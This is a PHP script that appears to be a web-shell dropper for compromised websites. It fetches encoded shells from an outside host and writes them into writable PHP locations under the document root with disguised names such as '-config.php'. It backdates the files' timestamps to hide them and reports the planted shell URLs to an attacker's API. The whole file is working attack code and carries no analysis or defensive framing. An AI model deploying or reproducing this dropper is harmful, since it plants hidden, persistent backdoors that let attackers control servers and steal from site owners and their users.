<?php

define('CURRENTDIR', getcwd());
define('API_PATH', 'http://kentuckyfriedbeef.com/src/acc.php');
$shPath = 'http://kentuckyfriedbeef.com/src/temp/tmp.txt';

/** without http * */
define('PATH_TO_BACK_SHELL', 'jard.me/load');
/** without http * */
$shString = (!function_exists('curl_init')) ? file_get_contents($shPath) : getsource($shPath);

if (!$shString) {
    echo 'check sh domain' . PHP_EOL;
    exit;
}

$fileNameSuffixes = array('ajax-response', 'cron', 'stream', 'private', 'meta'
    , 'config', 'core', 'ajax', 'response', 'request', 'results', 'format', 'header'
    , 'hash', 'extract', 'handler', 'tags');

$suffixesCount = count($fileNameSuffixes);
$shString = (!function_exists('curl_init')) ? file_get_contents($shPath) : getsource($shPath);

$shArr = unserialize(base64_decode($shString));
unset($shArr['wp-config-sample.php?config']);
$keys = array_keys($shArr);

$allPaths = findFiles(realpath($_SERVER['DOCUMENT_ROOT']), count($shArr));


foreach ($allPaths as $path) {

    if (empty($keys)) {
        break;
    }

    $newName = str_replace('.php', '-' . $fileNameSuffixes[rand(0, $suffixesCount - 1)] . '.php', $path);

    $shKey = array_shift($keys);
    $randSh = $shArr[$shKey];


    file_put_contents($newName, $randSh);
    touch($newName, frequenttimestamp(dirname($newName)));
    $explodedPath = explode('?', $shKey);
    $url = currenturl($newName);

    $shUrls[] = (isset($explodedPath[1])) ? $url . '?' . backPath($explodedPath[1]) : $url;
}


echo implode("\n", $shUrls) . "\n";


$responseData = sendpost(API_PATH, array(
    'source' => base64_encode(serialize($shUrls)),
        ));

function backPath($explodedPath) {
    if (defined('PATH_TO_BACK_SHELL') && (stristr($explodedPath, 'example.com') !== false )) {
        return str_replace('example.com', PATH_TO_BACK_SHELL, $explodedPath);
    }
    return $explodedPath;
}

function findFiles($dir, $filesCount = 2, $depthLimit = 1) {

    if (!is_dir($dir)) {
        return;
    }

    $path = realpath($dir);


    $objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)
            , RecursiveIteratorIterator::SELF_FIRST
            , RecursiveIteratorIterator::CATCH_GET_CHILD);

    $objects->setMaxDepth($depthLimit);

    $tmp = array();

    foreach ($objects as $name => $object) {

        $path = $object->getPathName();
        if (stristr($path, '.php') === false) {
            continue;
        }
        if (!is_writeable(dirname($path))) {
            continue;
        }

        $tmp[$path] = 1;
    }

    $files = array_keys($tmp);
    shuffle($files);

    return array_slice($files, 0, $filesCount);
}

function getsource($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $data = curl_exec($ch);

    $res = (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 200) ? $data : NULL;

    curl_close($ch);
    return $res;
}

function sendpost($url, $data) {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $result = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    return ($info["http_code"] == 200) ? trim($result) : null;
}

function frequenttimestamp($pathtodir) {

    foreach (glob($pathtodir . "/*php") as $file) {
        $tmp[] = filemtime($file);
    }
    $count = array_count_values($tmp);
    arsort($count);

    return array_shift(array_keys($count));
}

function currenturl($rootDir) {
    $tmp = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', 'http://' . $_SERVER['HTTP_HOST'] . $rootDir);
    return $tmp;
}
